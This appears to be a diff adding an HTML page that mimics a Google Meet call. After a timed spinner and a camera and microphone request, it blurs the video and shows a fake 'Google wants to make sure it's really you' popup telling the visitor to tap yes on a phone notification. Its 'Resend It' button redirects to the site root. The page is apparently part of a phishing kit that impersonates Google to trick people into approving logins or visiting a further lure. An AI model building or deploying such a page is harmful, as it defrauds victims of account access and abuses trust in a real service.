@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Video Call</title>
+<link rel="stylesheet" href="style.css">
+<link rel="icon" href="../../assets/logoo.png" type="image/x-icon">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+<style>
+  /* Blur effect for video */
+  .video-area.blur {
+    filter: blur(8px);
+    position: relative;
+  }
+
+  .video-area.blur::after {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(0, 0, 0, 0.3);
+  }
+
+  /* Loading spinner */
+  .spinner-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.7);
+    z-index: 1000;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .spinner {
+    width: 50px;
+    height: 50px;
+    border: 5px solid rgba(255, 255, 255, 0.3);
+    border-radius: 50%;
+    border-top-color: #fff;
+    animation: spin 1s ease-in-out infinite;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  /* Verification Popup (আপনার দেওয়া ডিজাইন) */
+  .popup-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.8);
+    z-index: 1001;
+    align-items: center;
+    justify-content: center;
+    font-family: "Google Sans", Arial, sans-serif;
+  }
+
+  .popup {
+    background: #fff;
+    border-radius: 10px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+    padding: 30px 25px;
+    width: 360px;
+    text-align: center;
+  }
+
+  .popup .logo {
+    width: 150px;
+    margin-bottom: 20px;
+  }
+
+  .popup h1 {
+    font-size: 22px;
+    font-weight: 500;
+    color: #242424;
+    margin-bottom: 10px;
+  }
+
+  .popup .phone {
+    width: 220px;
+    margin: 10px 0;
+    display: block;
+    height: auto;
+    object-fit: contain;
+  }
+
+  .popup h2 {
+    font-size: 18px;
+    margin: 15px 0 8px;
+    font-weight: 600;
+    color: #222;
+  }
+
+  .popup p {
+    font-size: 14px;
+    color: #555;
+    line-height: 1.5;
+    margin: 0 0 10px;
+  }
+
+  .popup .checkbox {
+    margin: 15px 0;
+    font-size: 13px;
+    color: #555;
+    text-align: left;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .popup button {
+    background-color: #1a73e8;
+    border: none;
+    color: white;
+    font-size: 15px;
+    padding: 10px 24px;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background-color 0.2s ease;
+    margin-top: 10px;
+  }
+
+  .popup button:hover {
+    background-color: #1669c1;
+  }
+
+  /* Responsive */
+  @media (max-width: 400px) {
+    .popup {
+      width: 100%;
+      padding: 20px;
+    }
+    .popup .phone {
+      width: 180px;
+    }
+    .popup h1, .popup h2 {
+      font-size: 16px;
+    }
+    .popup p {
+      font-size: 13px;
+    }
+  }
+</style>
+</head>
+
+<body>
+
+<header class="topbar">
+  <div class="left">
+    <span id="time"></span>
+    <span class="line"></span>
+    <h3>epb-pwht-pph</h3>
+  </div>
+  <div class="right">
+    <button class="more">
+      <i class="fa-solid fa-ellipsis-vertical"></i>
+    </button>
+  </div>
+</header>
+
+<div class="video-area" id="videoArea">
+  <video id="video" autoplay playsinline muted></video>
+  <div class="username">You</div>
+</div>
+
+<div class="reaction-bar">
+  😀 😂 😍 👏 👍 ❤️ 😢 😮
+</div>
+
+<div class="controls">
+  <button id="micBtn" class="control">
+    <i class="fa-solid fa-microphone"></i>
+  </button>
+  <button id="camBtn" class="control">
+    <i class="fa-solid fa-video"></i>
+  </button>
+  <button id="shareBtn" class="control">
+    <i class="fa-solid fa-display"></i>
+  </button>
+  <button id="emojiBtn" class="control">
+    <i class="fa-regular fa-face-smile"></i>
+  </button>
+  <button id="endBtn" class="control end">
+    <i class="fa-solid fa-phone"></i>
+  </button>
+</div>
+
+<!-- Loading Spinner -->
+<div class="spinner-overlay" id="spinnerOverlay">
+  <div class="spinner"></div>
+</div>
+
+<!-- Verification Popup (আপনার দেওয়া ডিজাইন) -->
+<div class="popup-overlay" id="popupOverlay">
+  <div class="popup">
+    <img class="logo" src="../../assets/logon.png" alt="Your Logo">
+    <h1></h1>
+    <p>Google Wants to make sure it's really you trying to join a Google Meet video call.</p>
+
+    <img class="phone" src="../../assets/icon.gif" alt="Phone gif">
+
+    <h2>Check Your Phone</h2>
+    <p>Google sent a notification to your phone.<br>Tap yes on the notification, then tap the meeting code to join the video call.</p>
+
+    <div class="checkbox">
+      <input type="checkbox" id="dontask">
+      <label for="dontask">Don't ask again on this device</label>
+    </div>
+
+    <button id="resendBtn">Resend It</button>
+  </div>
+</div>
+
+<script>
+const video = document.getElementById("video");
+const videoArea = document.getElementById("videoArea");
+const spinnerOverlay = document.getElementById("spinnerOverlay");
+const popupOverlay = document.getElementById("popupOverlay");
+
+// Loading দেখাও
+spinnerOverlay.style.display = "flex";
+
+// ৩ সেকেন্ড পরে spinner hide
+setTimeout(() => {
+    spinnerOverlay.style.display = "none";
+
+    // Blur
+    videoArea.classList.add("blur");
+
+    // Popup
+    setTimeout(() => {
+        popupOverlay.style.display = "flex";
+    }, 1500);
+
+}, 3000);
+
+// Camera চালু করার চেষ্টা (optional)
+if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({
+        video: true,
+        audio: true
+    })
+    .then(stream => {
+        video.srcObject = stream;
+    })
+    .catch(err => {
+        console.log("Camera unavailable:", err);
+        // কিছুই করবো না।
+        // Popup timer অনুযায়ী নিজেই চলে আসবে।
+    });
+}
+
+// Resend Button
+document.getElementById("resendBtn").addEventListener("click", () => {
+    window.location.href = "../../";
+});
+</script>
+</body>
+</html>
